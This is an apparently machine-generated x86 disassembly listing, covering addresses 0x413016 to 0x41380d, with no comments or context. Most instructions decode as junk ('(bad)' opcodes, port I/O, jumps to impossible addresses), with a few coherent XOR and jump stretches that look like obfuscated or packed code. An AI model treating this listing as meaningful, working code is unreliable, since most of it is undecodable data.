  413016:	sbb    eax,0xdbcbe00a
  41301b:	mov    esp,0xef331ce7
  413020:	(bad)  
  413021:	ins    DWORD PTR es:[edi],dx
  413022:	in     eax,dx
  413023:	repz cmp ecx,DWORD PTR [edx+ecx*4]
  413027:	pop    ebp
  413028:	mov    al,gs:0x6e1b6ff4
  41302e:	fistp  DWORD PTR [esp+ebp*1-0x193ccc8c]
  413035:	sub    ch,BYTE PTR [edi]
  413037:	imul   edi,DWORD PTR [eax-0x72522e77],0x732ac633
  413041:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413042:	pop    esp
  413043:	(bad)  
  413044:	push   eax
  413045:	cmc    
  413046:	je     0x41301c
  413048:	in     al,dx
  413049:	shl    ebx,1
  41304b:	push   edi
  41304c:	mov    ecx,0x2e7b8ba0
  413051:	fbstp  TBYTE PTR [edx+eiz*2+0x3bc3e299]
  413058:	out    0x6b,eax
  41305a:	sbb    al,0x45
  41305c:	outs   dx,BYTE PTR ds:[si]
  41305e:	xchg   ecx,eax
  41305f:	cmp    BYTE PTR [ebx+0x79],dl
  413062:	pop    ebx
  413063:	(bad)  [eax+0x3a]
  413066:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413067:	sbb    al,bh
  413069:	cmp    eax,0xad9ffabb
  41306e:	sbb    DWORD PTR [edi],0x602b66d9
  413074:	repnz adc esp,DWORD PTR [ebp+eax*4-0x74]
  413079:	mov    BYTE PTR [ecx+0x7642f277],ah
  41307f:	push   ebp
  413080:	sbb    dh,0xff
  413083:	cwde   
  413084:	push   ds
  413085:	bound  ebx,QWORD PTR [edx+0x5b]
  413088:	cmp    edx,esp
  41308a:	lds    edx,FWORD PTR [edx+0x18]
  41308d:	jge    0x4130b4
  41308f:	add    edx,DWORD PTR [ebx]
  413091:	pop    eax
  413092:	test   BYTE PTR [edi+0xf4b0dab],ah
  413098:	xchg   ebp,eax
  413099:	hlt    
  41309a:	mov    bh,0x63
  41309c:	nop
  41309d:	mov    WORD PTR [ecx],cs
  41309f:	sub    DWORD PTR [edx+0x67],0xc9cb86e8
  4130a6:	dec    esp
  4130a7:	in     al,dx
  4130a8:	and    DWORD PTR [ebx-0x12a81bae],eax
  4130ae:	cmp    cl,0x1d
  4130b1:	cmp    ebp,ecx
  4130b3:	stc    
  4130b4:	stos   BYTE PTR es:[edi],al
  4130b5:	pop    ebp
  4130b6:	pusha  
  4130b7:	cli    
  4130b8:	hlt    
  4130b9:	js     0x41307f
  4130bb:	adc    eax,0x53d60c6
  4130c0:	push   esi
  4130c1:	cld    
  4130c2:	push   cs
  4130c3:	ins    DWORD PTR es:[edi],dx
  4130c4:	int    0x8e
  4130c6:	or     bh,BYTE PTR ds:0x723bef01
  4130cc:	aaa    
  4130cd:	mov    al,ds:0x7841b44
  4130d2:	out    0xb2,al
  4130d4:	sub    eax,0x26ed716a
  4130d9:	add    BYTE PTR ss:[esi],bh
  4130dc:	sub    al,0x7b
  4130de:	imul   ebx,esp,0x18dcd66b
  4130e4:	cwde   
  4130e5:	add    DWORD PTR ds:0xdf5dd77a,ebp
  4130eb:	push   eax
  4130ec:	test   al,0x18
  4130ee:	xchg   ebp,eax
  4130ef:	popa   
  4130f0:	pop    ds
  4130f1:	test   DWORD PTR [edi],edi
  4130f3:	sbb    al,0xd1
  4130f5:	sub    esi,ebp
  4130f7:	fptan  
  4130f9:	arpl   WORD PTR [ebp+0x4811c916],di
  4130ff:	(bad)  
  413100:	lahf   
  413101:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413102:	mov    ah,0xdb
  413104:	lods   eax,DWORD PTR ds:[esi]
  413105:	test   BYTE PTR [esi+0x30],bh
  413108:	dec    ebx
  413109:	and    cl,0x1a
  41310c:	addr16 cmc 
  41310e:	in     eax,0x38
  413110:	cmp    cl,BYTE PTR [ebp+0x65]
  413113:	adc    BYTE PTR [edi-0x66e5887d],0x87
  41311a:	fild   QWORD PTR [edi+0x5e7db8eb]
  413120:	mov    al,ds:0x1c5ddfbf
  413125:	pop    ebx
  413126:	jge    0x413196
  413128:	je     0x413135
  41312a:	mov    ecx,0x57c9af16
  41312f:	and    dl,BYTE PTR [edx-0x179f90f]
  413135:	sub    esp,ebp
  413137:	push   esi
  413138:	mov    edx,0x6b9bded8
  41313d:	xor    BYTE PTR [edi],0x55
  413140:	inc    ebp
  413141:	or     eax,0x4ee584e5
  413146:	hlt    
  413147:	push   es
  413148:	mov    DWORD PTR [ebp-0x28],esi
  41314b:	mov    DWORD PTR [ebp-0x2c],esi
  41314e:	mov    DWORD PTR [ebp-0x14],esi
  413151:	adc    ecx,0x52b8
  413157:	mov    DWORD PTR [ebp-0x8],esi
  41315a:	xor    ecx,DWORD PTR ds:0x42fdf9
  413160:	mov    ecx,DWORD PTR [ebp-0x18]
  413163:	xor    ecx,eax
  413165:	adc    DWORD PTR ds:0x42e228,ebx
  41316b:	xor    edi,edi
  41316d:	jmp    0x413451
  413172:	push   0x51581534
  413177:	popa   
  413178:	jne    0x4131ae
  41317a:	add    edx,ebp
  41317c:	cmp    al,BYTE PTR [ecx]
  41317e:	outs   dx,DWORD PTR ds:[esi]
  41317f:	ds loope 0x413170
  413182:	mov    ds:0xb9707061,eax
  413187:	jle    0x4131f9
  413189:	jo     0x413143
  41318b:	sbb    al,0x3b
  41318d:	(bad)  
  41318e:	or     dh,BYTE PTR [edi+edx*1-0x4acbf91f]
  413195:	mov    ecx,0x3b1642db
  41319a:	cs adc al,0xb4
  41319d:	std    
  41319e:	aad    0xd1
  4131a0:	inc    esi
  4131a1:	lock dec edx
  4131a3:	scas   al,BYTE PTR es:[edi]
  4131a4:	aad    0x13
  4131a6:	mov    dh,0xa8
  4131a8:	mov    gs,edi
  4131aa:	pop    esp
  4131ab:	sub    bl,0xe3
  4131ae:	pusha  
  4131af:	frstor [eax+0x57]
  4131b2:	xor    edi,DWORD PTR [edx-0x2e]
  4131b5:	adc    al,0xe6
  4131b7:	enter  0xb813,0xac
  4131bb:	hlt    
  4131bc:	cmp    edi,DWORD PTR [edi+0x4e]
  4131bf:	icebp  
  4131c0:	push   ds
  4131c1:	mov    edx,DWORD PTR [edx]
  4131c3:	mov    bh,0x77
  4131c5:	in     eax,0xfc
  4131c7:	repnz and BYTE PTR [esi+edx*4+0x52ad1bd5],al
  4131cf:	xchg   ebp,eax
  4131d0:	outs   dx,BYTE PTR ds:[esi]
  4131d1:	pop    eax
  4131d2:	mov    dl,0xbe
  4131d4:	sti    
  4131d5:	les    ecx,FWORD PTR cs:[ebx]
  4131d8:	or     al,0x61
  4131da:	add    bh,BYTE PTR [esi+0x57]
  4131dd:	or     eax,0x631b3b5e
  4131e2:	mov    DWORD PTR [edi+0xc],ecx
  4131e5:	xor    ecx,DWORD PTR [eax-0x5b2d6497]
  4131eb:	sahf   
  4131ec:	mov    ecx,edi
  4131ee:	int3   
  4131ef:	xor    dh,bl
  4131f1:	jo     0x413175
  4131f3:	mov    ecx,0x46604a93
  4131f8:	cmp    DWORD PTR [ecx-0x4f9746cf],edi
  4131fe:	mov    al,0x4b
  413200:	imul   esp,edi,0xffffffb2
  413203:	mov    al,ds:0x28013324
  413208:	pop    ds
  413209:	in     eax,dx
  41320a:	cmc    
  41320b:	scas   al,BYTE PTR es:[edi]
  41320c:	cmp    BYTE PTR [ebx-0x33],0xb3
  413210:	retf   
  413211:	sar    edi,cl
  413213:	ins    BYTE PTR es:[edi],dx
  413214:	xchg   DWORD PTR [ebx+0x1f04ec10],ebx
  41321a:	icebp  
  41321b:	std    
  41321c:	jns    0x4131bd
  41321e:	push   edx
  41321f:	dec    ebp
  413220:	addr16 cmc 
  413222:	mov    ebp,0xb0addb6e
  413227:	pop    edi
  413228:	addr16 xor cl,al
  41322b:	mov    ds:0xeb5f7552,eax
  413230:	mov    ss,WORD PTR [edx]
  413232:	inc    esi
  413233:	sar    BYTE PTR [ecx+0x46],0x18
  413237:	rol    BYTE PTR [ebx],0xd3
  41323a:	jo     0x4131d3
  41323c:	add    ah,ch
  41323e:	je     0x4131c0
  413240:	jl     0x41326a
  413242:	test   DWORD PTR [ecx-0x6d],esp
  413245:	jl     0x413287
  413247:	mov    dl,0xd2
  413249:	stc    
  41324a:	rol    bl,0x52
  41324d:	repz lock xchg edi,eax
  413250:	adc    al,0x1d
  413252:	in     eax,dx
  413253:	jle    0x41327f
  413255:	je     0x4132c9
  413257:	fsubr  st(3),st
  413259:	or     ecx,DWORD PTR [eax-0x1356f13a]
  41325f:	enter  0x538a,0xb6
  413263:	jl     0x4132bd
  413265:	add    eax,0x78849dd6
  41326a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41326b:	sbb    DWORD PTR [edx-0x2d3df1b7],esi
  413271:	scas   al,BYTE PTR es:[edi]
  413272:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413273:	xchg   BYTE PTR [esi],bh
  413275:	jns    0x413234
  413277:	pop    edi
  413278:	sub    eax,0x3d38e500
  41327d:	fucomi st,st(1)
  41327f:	daa    
  413280:	xor    DWORD PTR [edx-0x75],ebx
  413283:	rcr    DWORD PTR [edx],1
  413285:	(bad)  
  413286:	mov    eax,ds:0x8c288457
  41328b:	xchg   edx,eax
  41328c:	(bad)  
  41328d:	popa   
  41328e:	xchg   esi,eax
  41328f:	fadd   st(7),st
  413291:	(bad)  
  413292:	and    eax,DWORD PTR [esi-0x34]
  413295:	scas   eax,DWORD PTR es:[edi]
  413296:	jne    0x413253
  413298:	mov    ebx,0x82b99bb
  41329d:	div    BYTE PTR [edi-0x4c]
  4132a0:	test   DWORD PTR [edx+ebp*1-0x777d6fe6],ebp
  4132a7:	sub    DWORD PTR [eax],esp
  4132a9:	inc    esi
  4132aa:	cs (bad) 
  4132ac:	mov    es,WORD PTR [ecx-0x5c]
  4132af:	pop    ecx
  4132b0:	cmp    DWORD PTR [edi-0x2efa53cc],esi
  4132b6:	and    ch,BYTE PTR [esp+eiz*8-0x9]
  4132ba:	and    DWORD PTR [edi-0x3a],ecx
  4132bd:	ss fs mov dl,0x70
  4132c1:	inc    edi
  4132c2:	gs ins DWORD PTR es:[edi],dx
  4132c4:	loop   0x413252
  4132c6:	pop    esi
  4132c7:	xchg   ebp,eax
  4132c8:	mov    cl,0x5a
  4132ca:	xor    eax,0xc49818fe
  4132cf:	push   edx
  4132d0:	pop    edx
  4132d1:	or     BYTE PTR [eax-0x15],ah
  4132d4:	or     ch,BYTE PTR [ebx+0x7b9709b3]
  4132da:	aad    0x69
  4132dc:	sbb    esi,DWORD PTR [ebx]
  4132de:	xchg   edx,eax
  4132df:	xchg   esi,eax
  4132e0:	outs   dx,DWORD PTR ds:[esi]
  4132e1:	mov    eax,ds:0x2ddd0a31
  4132e6:	stc    
  4132e7:	add    DWORD PTR [eax+0x5],ebp
  4132ea:	mov    esi,0x9a916f2f
  4132ef:	ins    BYTE PTR es:[edi],dx
  4132f0:	xor    DWORD PTR [ebx-0xb],edx
  4132f3:	sbb    BYTE PTR [esi],ah
  4132f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4132f6:	rcl    BYTE PTR [esi],1
  4132f8:	jo     0x413317
  4132fa:	jmp    0x41329b
  4132fc:	imul   esp,DWORD PTR [edx],0xfffffff1
  4132ff:	nop
  413300:	pop    ebp
  413301:	sub    ebp,DWORD PTR [eax-0x88d177]
  413307:	xor    al,0x44
  413309:	mov    ecx,0x46e2dbaf
  41330e:	xor    al,0x14
  413310:	mov    eax,0xd7769bb6
  413315:	adc    eax,0x23fa907b
  41331a:	int    0x36
  41331c:	adc    ch,BYTE PTR [edi+0x69]
  41331f:	dec    ecx
  413320:	mov    bh,0xd0
  413322:	ret    
  413323:	leave  
  413324:	leave  
  413325:	inc    esp
  413326:	fisttp QWORD PTR [edx]
  413328:	sub    bl,ch
  41332a:	js     0x413355
  41332c:	or     ecx,DWORD PTR [ebx-0x10]
  41332f:	mov    ds:0xf8f0f716,eax
  413334:	or     al,0xc1
  413336:	xchg   BYTE PTR [eax+0x6578831d],dl
  41333c:	pop    es
  41333d:	mov    bh,BYTE PTR [ecx]
  41333f:	jle    0x41339f
  413341:	jbe    0x413312
  413343:	leave  
  413344:	adc    dl,bl
  413346:	je     0x413391
  413348:	xchg   edi,esp
  41334a:	push   ecx
  41334b:	pop    esi
  41334c:	sbb    BYTE PTR [edx],0xc9
  41334f:	cli    
  413350:	and    bh,BYTE PTR [ebx+0x3e5be03d]
  413356:	dec    eax
  413357:	ficom  DWORD PTR [edi+0x56]
  41335a:	xchg   DWORD PTR ds:0xad1fe18,ecx
  413360:	loope  0x413392
  413362:	xchg   ebp,eax
  413363:	add    al,0x2e
  413365:	inc    ebx
  413366:	jmp    DWORD PTR [ecx-0x6a]
  413369:	aaa    
  41336a:	mov    esi,0x64185ae0
  41336f:	fucomp st(0)
  413371:	mov    edi,0x875469f7
  413376:	xchg   ebp,eax
  413377:	inc    ecx
  413378:	push   0x889a8dce
  41337d:	ret    0xfe7a
  413380:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413381:	lea    esi,[ebx+0x54632836]
  413387:	cmp    eax,0x5acd7096
  41338c:	enter  0x6fc5,0x34
  413390:	sbb    BYTE PTR [edi+0x687bc1b1],dh
  413396:	fadd   DWORD PTR [esi+edx*1]
  413399:	scas   eax,DWORD PTR es:[edi]
  41339a:	jb     0x413354
  41339c:	popf   
  41339d:	stos   BYTE PTR es:[edi],al
  41339e:	data16 xor al,0xbe
  4133a1:	mov    bh,0xed
  4133a3:	(bad)  
  4133a4:	hlt    
  4133a5:	sbb    DWORD PTR [edi],ecx
  4133a7:	inc    edx
  4133a8:	pop    ss
  4133a9:	push   edx
  4133aa:	cmp    al,0x9c
  4133ac:	sub    ch,BYTE PTR [ebx]
  4133ae:	jp     0x4133a8
  4133b0:	xchg   edi,eax
  4133b1:	dec    esi
  4133b2:	aas    
  4133b3:	inc    ebp
  4133b4:	inc    eax
  4133b5:	inc    edi
  4133b6:	and    DWORD PTR [esi-0xcd8c1c],esp
  4133bc:	stos   BYTE PTR es:[edi],al
  4133bd:	js     0x4133ec
  4133bf:	jecxz  0x41338f
  4133c1:	jae    0x41334a
  4133c3:	xchg   esi,eax
  4133c4:	dec    edi
  4133c5:	(bad)  
  4133c6:	in     eax,dx
  4133c7:	pop    edi
  4133c8:	and    DWORD PTR [ebp-0xa],esi
  4133cb:	adc    DWORD PTR [ecx-0x5b],ecx
  4133ce:	pop    ebx
  4133cf:	shl    BYTE PTR [ecx+ebx*8-0x38],cl
  4133d3:	dec    eax
  4133d4:	aam    0xda
  4133d6:	out    0x47,eax
  4133d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4133d9:	and    bl,BYTE PTR [esi-0x60af0883]
  4133df:	adc    ebx,DWORD PTR [ecx+eiz*1-0x5c64a07]
  4133e6:	je     0x413379
  4133e8:	adc    BYTE PTR [edi+0xaac8ada],dl
  4133ee:	dec    ebp
  4133ef:	or     ecx,esp
  4133f1:	fidiv  WORD PTR [ebx-0x246a405b]
  4133f7:	xchg   edx,eax
  4133f8:	mov    edx,0xac146881
  4133fd:	clc    
  4133fe:	mov    ch,0x44
  413400:	(bad)  
  413401:	mov    bl,0x46
  413403:	xlat   BYTE PTR ds:[ebx]
  413404:	in     eax,0x5
  413406:	daa    
  413407:	pushf  
  413408:	cmc    
  413409:	adc    cl,BYTE PTR [ebp-0xd7b1ae0]
  41340f:	pushf  
  413410:	mov    bl,cl
  413412:	sub    bh,ch
  413414:	push   0xf
  413416:	add    dh,BYTE PTR [ebx]
  413418:	inc    edi
  413419:	retf   
  41341a:	cld    
  41341b:	mov    ch,0xea
  41341d:	mov    edx,0xeafb3f81
  413422:	pop    ebx
  413423:	jp     0x4133af
  413425:	fadd   QWORD PTR [ecx-0x3f]
  413428:	enter  0xf14,0xdf
  41342c:	mov    bh,0x9d
  41342e:	fist   DWORD PTR [ebx-0x1b]
  413431:	into   
  413432:	cmp    BYTE PTR [edi],ah
  413434:	mov    DWORD PTR cs:[edx+0x257225a0],0x43828c57
  41343f:	(bad)  [ebp+0x27]
  413442:	imul   ebx,eax,0x3879c9f1
  413448:	mov    al,0x26
  41344a:	arpl   bx,si
  41344c:	pop    ss
  41344d:	pop    esp
  41344e:	dec    edx
  41344f:	leave  
  413450:	push   es
  413451:	add    ecx,ebx
  413453:	mov    eax,0x213e
  413458:	mov    DWORD PTR [ebp-0x20],ecx
  41345b:	mov    eax,DWORD PTR [ebp-0x20]
  41345e:	je     0x414b6a
  413464:	not    DWORD PTR ds:0x42fdf9
  41346a:	mov    eax,DWORD PTR [ebp-0x4]
  41346d:	xor    eax,0x7510855
  413472:	xor    DWORD PTR ds:0x42fdd5,0x8f6
  41347c:	add    eax,ebx
  41347e:	jmp    0x413762
  413483:	inc    edx
  413484:	mov    WORD PTR [eax],cs
  413486:	jp     0x41345e
  413488:	adc    BYTE PTR [edx+0x54],0xc3
  41348c:	mov    ss:0x6e37860f,al
  413492:	loopne 0x413480
  413494:	outs   dx,BYTE PTR ds:[esi]
  413495:	jo     0x413507
  413497:	mov    ecx,0x6f70707e
  41349c:	test   DWORD PTR [edi-0x6f],edx
  41349f:	add    al,0xe
  4134a1:	fdivrp st(7),st
  4134a3:	xor    al,0xd8
  4134a5:	adc    DWORD PTR [ebp+0x2d],0x8d66035f
  4134ac:	stos   DWORD PTR es:[di],eax
  4134ae:	dec    esp
  4134af:	(bad)  
  4134b0:	mov    edx,0x5eb20fd1
  4134b5:	pusha  
  4134b6:	and    BYTE PTR [edx+0x76],cl
  4134b9:	mov    BYTE PTR [edx-0x3096e38f],0x9
  4134c0:	push   ds
  4134c1:	out    0xab,eax
  4134c3:	mov    edi,0xc2157833
  4134c8:	ficomp WORD PTR [eax]
  4134ca:	mov    BYTE PTR [ecx+0xde4ae65],dl
  4134d0:	mov    ebp,0x177e8e7
  4134d5:	inc    eax
  4134d6:	pop    ebx
  4134d7:	in     al,0x30
  4134d9:	and    esi,edi
  4134db:	loopne 0x413528
  4134dd:	pop    DWORD PTR [edx]
  4134df:	mov    ch,0x1e
  4134e1:	shl    BYTE PTR [eax-0x3f],0x1f
  4134e5:	adc    BYTE PTR [ebp-0x5f],bh
  4134e8:	mov    ss,WORD PTR [esi-0x17bde5fe]
  4134ee:	clc    
  4134ef:	cmp    BYTE PTR [ebx+0x12],0x53
  4134f3:	repnz rep ins BYTE PTR es:[edi],dx
  4134f6:	xor    al,0x7
  4134f8:	jmp    FWORD PTR [esi+0x30]
  4134fb:	(bad)  
  4134fc:	hlt    
  4134fd:	mov    ebp,0x60d99c36
  413502:	out    dx,eax
  413503:	(bad)
  413506:	xchg   esi,eax
  413507:	sbb    eax,0xd9813ab5
  41350c:	mov    bh,0xf4
  41350e:	jl     0x4134d4
  413510:	adc    DWORD PTR [ecx],esi
  413512:	test   eax,0x8e175594
  413517:	jp     0x413558
  413519:	jle    0x4134b8
  41351b:	jbe    0x413536
  41351d:	ss push edi
  41351f:	and    esp,DWORD PTR [edx+0x49f09f4d]
  413525:	out    0x19,eax
  413527:	std    
  413528:	mov    ecx,0xf10c8b5
  41352d:	xor    al,0xcd
  41352f:	mov    ecx,0x7c6c1707
  413534:	push   cs
  413535:	fimul  DWORD PTR [esp+ebp*4]
  413538:	adc    BYTE PTR [ebp+0x74739090],ch
  41353e:	jbe    0x41359f
  413540:	sti    
  413541:	adc    bl,BYTE PTR [esi-0x965aa77]
  413547:	dec    eax
  413548:	das    
  413549:	int    0x77
  41354b:	jmp    0x2dd6:0xf411bcc9
  413552:	lods   eax,DWORD PTR ds:[esi]
  413553:	js     0x4134f7
  413555:	jl     0x413533
  413557:	in     eax,0x11
  413559:	cdq    
  41355a:	repz jl 0x41356d
  41355d:	mov    dl,0xb7
  41355f:	cmp    al,0xc5
  413561:	add    al,0x22
  413563:	jl     0x41359f
  413565:	dec    BYTE PTR [esi+0x43]
  413568:	loop   0x4134f4
  41356a:	sbb    ebp,edx
  41356c:	mov    eax,ds:0xe72a93f8
  413571:	and    eax,0xb34441fb
  413576:	add    al,0x94
  413578:	mov    ecx,0xf8efe563
  41357d:	add    al,0xf9
  41357f:	sti    
  413580:	xor    eax,DWORD PTR [ebx]
  413582:	or     DWORD PTR [ecx+0x7a],eax
  413585:	inc    ebx
  413586:	cmc    
  413587:	sub    eax,0x334205fb
  41358c:	pop    es
  41358d:	test   al,0x2b
  41358f:	ret    
  413590:	xchg   edi,eax
  413591:	or     BYTE PTR [ebx+0x3f],0xee
  413595:	xchg   ecx,eax
  413596:	(bad)  
  413597:	out    0x2f,al
  413599:	xchg   ebx,eax
  41359a:	push   ebx
  41359b:	sbb    esi,edx
  41359d:	adc    al,0x6e
  41359f:	mov    bl,0x45
  4135a1:	sub    BYTE PTR [ebx-0x20],al
  4135a4:	in     al,0x78
  4135a6:	sub    al,0x3f
  4135a8:	repz cmp cl,BYTE PTR ds:0x2d0f2d76
  4135af:	scas   al,BYTE PTR es:[edi]
  4135b0:	rcl    DWORD PTR [ebx],cl
  4135b2:	aas    
  4135b3:	(bad)  [ebp-0x3209aa77]
  4135b9:	inc    edx
  4135ba:	adc    ebx,DWORD PTR [edi+0x7f]
  4135bd:	pop    ebp
  4135be:	fs push esi
  4135c0:	js     0x413580
  4135c2:	shl    esi,cl
  4135c4:	cwde   
  4135c5:	fsub   DWORD PTR [esi]
  4135c7:	hlt    
  4135c8:	add    DWORD PTR [ebx*1+0x27d8edb1],eax
  4135cf:	fs enter 0x244a,0x45
  4135d4:	xchg   DWORD PTR [ecx],esi
  4135d6:	cmp    al,0xa6
  4135d8:	mov    dl,0xef
  4135da:	xchg   esi,eax
  4135db:	dec    ebp
  4135dc:	int    0x5b
  4135de:	sbb    DWORD PTR ds:0x137335ff,edx
  4135e4:	jns    0x41362d
  4135e6:	cmc    
  4135e7:	rcr    eax,0x56
  4135ea:	stos   BYTE PTR es:[edi],al
  4135eb:	(bad)  
  4135ec:	in     eax,0xd
  4135ee:	mov    cl,0x65
  4135f0:	jne    0x4135c2
  4135f2:	mov    BYTE PTR [eax-0xa],bh
  4135f5:	call   0xab4b:0xde991905
  4135fc:	xor    BYTE PTR [ebp-0x69ad7a11],ch
  413602:	jns    0x41363c
  413604:	dec    esi
  413605:	retf   0x1bcb
  413608:	addr16 aaa 
  41360a:	adc    ebp,DWORD PTR [edi-0x15]
  41360d:	or     BYTE PTR [esi+0x5],bh
  413610:	les    esp,FWORD PTR [edx]
  413612:	sar    al,0xd3
  413615:	fiadd  DWORD PTR [ecx+0xc]
  413618:	ins    DWORD PTR es:[edi],dx
  413619:	sbb    eax,0x31f76bda
  41361e:	out    0x19,al
  413620:	push   0xaaf89bff
  413625:	sub    DWORD PTR [esi+0x4ee9cc70],esi
  41362b:	cdq    
  41362c:	icebp  
  41362d:	mov    WORD PTR [edx+0x3],cs
  413630:	jbe    0x4135fd
  413632:	loop   0x413697
  413634:	rcr    BYTE PTR [ebx],cl
  413636:	daa    
  413637:	pushf  
  413638:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413639:	dec    ebx
  41363a:	into   
  41363b:	xchg   edi,eax
  41363c:	inc    edi
  41363d:	push   edi
  41363e:	add    al,BYTE PTR [ebx+ebx*1]
  413641:	xchg   ecx,eax
  413642:	add    DWORD PTR [ebp-0x58b8ef5c],esi
  413648:	jno    0x413638
  41364a:	je     0x41366b
  41364c:	iret   
  41364d:	xchg   DWORD PTR [eax+0x1e],ebx
  413650:	mov    bh,0xb8
  413652:	jmp    0x9b98f04a
  413657:	jb     0x413610
  413659:	jae    0x344256f5
  41365f:	ins    DWORD PTR es:[edi],dx
  413660:	aaa    
  413661:	in     al,0x16
  413663:	jl     0x41360c
  413665:	mov    dl,BYTE PTR [esi+0x52]
  413668:	sbb    DWORD PTR [ebp+0xec3193a],esi
  41366e:	mov    bh,0xc6
  413670:	or     eax,0xdcbb5a6e
  413675:	jbe    0x413688
  413677:	or     DWORD PTR [esi-0x2c44f92],esp
  41367d:	addr16 in al,0x2b
  413680:	pop    ebp
  413681:	push   ecx
  413682:	cmp    DWORD PTR [eax+0x4c],eax
  413685:	sti    
  413686:	mov    edi,0xa338729f
  41368b:	sti    
  41368c:	data16 hlt 
  41368e:	test   eax,0x2a576187
  413693:	adc    DWORD PTR [esi+0x23bf2c58],0x349ac32a
  41369d:	xchg   edi,eax
  41369e:	dec    BYTE PTR es:[ebx]
  4136a1:	dec    ebp
  4136a2:	test   BYTE PTR [ebp+0x2934df35],ch
  4136a8:	jle    0x4136d4
  4136aa:	imul   ebx,DWORD PTR [edx+0x6b8f9500],0x26
  4136b1:	and    eax,0x5652b10a
  4136b6:	stc    
  4136b7:	mov    ds,WORD PTR [eax+0x65d3c517]
  4136bd:	inc    ebx
  4136be:	jl     0x4136a5
  4136c0:	sbb    al,0x63
  4136c2:	shr    DWORD PTR [ebp+0x35],1
  4136c5:	test   esi,edx
  4136c7:	pop    ss
  4136c8:	jb     0x41364b
  4136ca:	cmp    eax,0xd0c63d99
  4136cf:	dec    eax
  4136d0:	sahf   
  4136d1:	leave  
  4136d2:	inc    eax
  4136d3:	out    0x31,al
  4136d5:	cmp    esi,DWORD PTR [eax]
  4136d7:	jmp    0x43017949
  4136dc:	push   es
  4136dd:	jns    0x4136ac
  4136df:	leave  
  4136e0:	mov    edi,edx
  4136e2:	ins    BYTE PTR es:[edi],dx
  4136e3:	iret   
  4136e4:	jns    0x41374e
  4136e6:	jae    0x413737
  4136e8:	sub    DWORD PTR ds:0x4187a32c,0x9d843430
  4136f2:	push   ecx
  4136f3:	popa   
  4136f4:	mov    ecx,0xe5f9c257
  4136f9:	jmp    0xa7f0a35d
  4136fe:	cmc    
  4136ff:	ret    
  413700:	cmc    
  413701:	cs scas eax,DWORD PTR es:[edi]
  413703:	jp     0x413718
  413705:	ret    0x98af
  413708:	retf   
  413709:	jno    0x413717
  41370b:	xlat   BYTE PTR ds:[ebx]
  41370c:	js     0x413707
  41370e:	cmp    dl,ah
  413710:	jne    0x41375b
  413712:	sbb    dh,BYTE PTR [edi+0x21]
  413715:	dec    esp
  413716:	leave  
  413717:	jnp    0x4136ee
  413719:	and    BYTE PTR [edi-0xa],al
  41371c:	bound  esp,QWORD PTR [eax]
  41371e:	xlat   BYTE PTR fs:[ebx]
  413720:	pop    ds
  413721:	adc    BYTE PTR [edx-0x3f],al
  413724:	jge    0x413781
  413726:	inc    edx
  413727:	lds    esi,FWORD PTR [edx+ebp*1]
  41372a:	add    al,0xf2
  41372c:	fcom   DWORD PTR [edx]
  41372e:	push   0xffffffa9
  413730:	sub    edi,edx
  413732:	in     al,0xa7
  413734:	pop    ecx
  413735:	test   DWORD PTR [eax],edx
  413737:	outs   dx,DWORD PTR ds:[esi]
  413738:	pop    ebx
  413739:	imul   ebp,DWORD PTR [ecx+0x120fd7f3],0x6b
  413740:	and    BYTE PTR fs:[ecx-0x55],ch
  413744:	loope  0x41374d
  413746:	fmul   QWORD PTR [edx]
  413748:	and    al,0xa1
  41374a:	in     eax,0x3b
  41374c:	pop    ebp
  41374d:	adc    BYTE PTR [ecx+0x22f0c85],0x85
  413754:	mov    edi,0xce18776
  413759:	mov    esi,0x3acb4a08
  41375e:	dec    ebx
  41375f:	pop    esp
  413760:	fs cli 
  413762:	cmp    edi,eax
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	repz jmp 0x413712
  413781:	(bad)  
  413782:	xor    eax,0xb970706b
  413787:	jle    0x4137f9
  413789:	jo     0x4137e1
  41378b:	(bad)  
  41378c:	jmp    0xf4bc:0xa56829c7
  413793:	sub    eax,0x8218bb3
  413798:	xchg   ebp,eax
  413799:	int    0xbd
  41379b:	add    DWORD PTR [edi-0x78],ebp
  41379e:	xchg   ebx,eax
  41379f:	add    al,0xbe
  4137a1:	jo     0x41377e
  4137a3:	sub    eax,0x86e4daf6
  4137a8:	int3   
  4137a9:	(bad)  
  4137ab:	test   al,0xa0
  4137ad:	std    
  4137ae:	mov    al,0x79
  4137b0:	lods   eax,DWORD PTR ds:[esi]
  4137b1:	ret    
  4137b2:	cli    
  4137b3:	xchg   BYTE PTR [edx],ch
  4137b5:	cdq    
  4137b6:	repz and BYTE PTR [esi+0x3f2a3e1],cl
  4137bd:	loope  0x4137b9
  4137bf:	leave  
  4137c0:	(bad)  
  4137c1:	out    0xb0,al
  4137c3:	mov    al,0xc5
  4137c5:	pop    ds
  4137c6:	inc    edx
  4137c7:	pop    ecx
  4137c8:	(bad)  
  4137c9:	fcomi  st,st(7)
  4137cb:	pop    ss
  4137cc:	mov    ds:0x5d31af68,al
  4137d1:	push   cs
  4137d2:	scas   al,BYTE PTR es:[edi]
  4137d3:	mov    cs,WORD PTR [eax-0xab4432f]
  4137d9:	mov    DWORD PTR [ecx],esi
  4137db:	push   ss
  4137dc:	xchg   ebp,eax
  4137dd:	xor    eax,0xad7365da
  4137e2:	rol    DWORD PTR [edi+0x5a1d3e22],cl
  4137e8:	data16 xor al,0x3f
  4137eb:	cmp    BYTE PTR [ecx],cl
  4137ed:	test   BYTE PTR [edx+eax*1-0x31d69735],0x7f
  4137f5:	xor    eax,0x25b22ffa
  4137fa:	xchg   ebp,eax
  4137fb:	xchg   BYTE PTR [ecx+eiz*8],bh
  4137fe:	daa    
  4137ff:	xor    ah,BYTE PTR [ecx+0x5f]
  413802:	jmp    0x55a7e5d6
  413807:	xor    eax,0xa25dedc9
  41380c:	dec    esp
  41380d:	fs lahf 
